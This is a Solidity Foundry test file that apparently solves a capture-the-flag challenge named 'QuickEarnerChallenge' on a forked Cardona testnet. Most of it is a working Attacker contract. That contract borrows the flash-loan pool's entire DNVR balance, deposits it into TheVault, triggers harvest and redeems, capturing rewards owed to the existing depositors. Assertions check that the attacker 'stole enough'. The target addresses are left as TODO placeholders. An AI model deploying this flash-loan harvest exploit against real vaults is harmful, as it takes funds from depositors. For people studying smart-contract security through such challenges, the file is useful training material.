// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {TheVault} from "src/v2/quick-earner/TheVault.sol";
import {FlashLoanPool} from "src/v2/quick-earner/FlashLoanPool.sol";

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IFlashLoanEtherReceiver {
    function execute() external;
}

contract Attacker is IFlashLoanEtherReceiver {

    TheVault public theVault;
    FlashLoanPool public flashLoanPool;

    constructor(address _theVaultAddress, address _flashLoanPoolAddress) {
        theVault = TheVault(_theVaultAddress);
        flashLoanPool = FlashLoanPool(_flashLoanPoolAddress);
    }

    function attack() public {
        flashLoanPool.flashLoan(IERC20(theVault.DNVR()).balanceOf(address(flashLoanPool)));
    }

    function execute() external override {
        IERC20(theVault.DNVR()).approve(address(theVault), IERC20(theVault.DNVR()).balanceOf(address(this)));
        theVault.deposit(theVault.DNVR().balanceOf(address(this)), address(this));
        theVault.harvest(address(this));
        theVault.redeem(theVault.balanceOf(address(this)), address(this), address(this));
    }
}

contract QuickEarnerChallenge is Test {

    Attacker private _attacker;

    TheVault private _theVault;
    FlashLoanPool private _flashLoanPool;

    IERC20 public constant DNVR = IERC20(0x84BbB983D8cF2F58bd9b2dE794a489d2e9798668);

    function setUp() external {

        vm.selectFork(vm.createFork(vm.envString("CARDONA_RPC_URL")));

        address _flashLoanPoolAddress = address(0); // TODO
        _flashLoanPool = FlashLoanPool(_flashLoanPoolAddress);

        address _theVaultAddress = address(0); // TODO
        _theVault = TheVault(_theVaultAddress);

        _attacker = new Attacker(_theVaultAddress, _flashLoanPoolAddress);
    }

    function testSolution() external {

        /** PRE ATTACK ASSERTS */

        assertTrue(DNVR.balanceOf(address(_theVault)) > 0, "QuickEarnerChallenge: LendingPool has no balance"); // a user has already deposited
        assertTrue(DNVR.balanceOf(address(_attacker)) == 0, "QuickEarnerChallenge: attacker already has a balance");

        uint256 _amountToHarvest = DNVR.balanceOf(address(_theVault)) - _theVault.totalAssets();

        /** ATTACK */

        _attacker.attack();

        /** POST ATTACK ASSERTS */

        assertTrue(DNVR.balanceOf(address(_attacker)) > _amountToHarvest / 2, "QuickEarnerChallenge: attacker did not steal enough");
    }
}